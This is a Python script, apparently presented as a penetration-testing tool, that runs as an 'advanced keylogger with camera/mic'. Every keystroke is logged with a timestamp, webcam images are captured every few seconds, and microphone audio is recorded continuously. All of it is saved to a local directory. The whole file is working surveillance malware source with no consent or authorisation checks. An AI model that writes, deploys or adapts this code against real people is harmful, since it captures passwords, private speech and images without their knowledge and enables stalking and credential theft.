import cv2
import sounddevice as sd
import numpy as np
from pynput import keyboard
import threading
import time
import os
from pydub import AudioSegment

# Directory to store logs and captures
LOG_DIR = "pentest_logs"
os.makedirs(LOG_DIR, exist_ok=True)

RUNNING = True  # Global flag to control threads 

# Camera capture
def capture_camera(interval=5):
    while RUNNING:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Error: Could not open camera.")
            break
        ret, frame = cap.read()
        if ret:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(LOG_DIR, f"camera_{timestamp}.png")
            cv2.imwrite(filename, frame)
            print(f"Camera capture saved: {filename}")
        cap.release()
        time.sleep(interval)

# Audio recording (FIXED)
def record_audio(duration=10, fs=44100):
    while RUNNING:
        print("Recording audio...")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(LOG_DIR, f"audio_{timestamp}.mp3")
        audio_segment = AudioSegment(
            data=recording.tobytes(),
            sample_width=recording.dtype.itemsize,
            frame_rate=fs,
            channels=2
        )
        audio_segment.export(filename, format="mp3")
        print(f"Audio recording saved: {filename}")

# Keystroke logging
def log_keystroke(key):
    try:
        keystroke = key.char
    except AttributeError:
        keystroke = str(key)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {keystroke}\n"
    log_file = os.path.join(LOG_DIR, "keystrokes.log")
    with open(log_file, "a") as f:
        f.write(log_entry)
    print(f"Logged: {log_entry.strip()}")

def on_press(key):
    log_keystroke(key)

# Main controller
def main():
    global RUNNING
    print("Starting advanced keylogger with camera/mic...")

    camera_thread = threading.Thread(target=capture_camera)
    audio_thread = threading.Thread(target=record_audio)

    camera_thread.start()
    audio_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            RUNNING = False
            print("\nStopping...")

    camera_thread.join()
    audio_thread.join()
    print("Pentest complete. Data saved in:", LOG_DIR)

if __name__ == "__main__":
    main()
